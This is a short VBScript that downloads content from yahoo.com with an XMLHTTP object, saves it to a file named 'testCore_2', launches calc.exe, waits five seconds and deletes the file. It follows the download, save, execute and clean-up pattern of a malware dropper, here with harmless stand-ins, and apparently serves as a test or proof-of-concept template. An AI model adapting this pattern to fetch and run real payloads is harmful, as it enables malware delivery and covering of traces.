Set so = CreateObject("Scripting.FileSystemObject")
set m = CreateObject("Msxml2.ServerXMLHTTP.6.0")
m.open "GET","https://yahoo.com",false
m.send
If m.status = 200 Then
    set f_ = CreateObject("adodb.stream")
    f_.open
    f_.type = 1
    f_.write m.responsebody
    f_.savetofile "testCore_2",2
    f_.close
    set  ws = CreateObject("wscript.shell")
    ws.run("calc.exe")
    ws.run "Timeout /T 5 /nobreak" ,0 ,true
    so.DeleteFile "testCore_2"
End If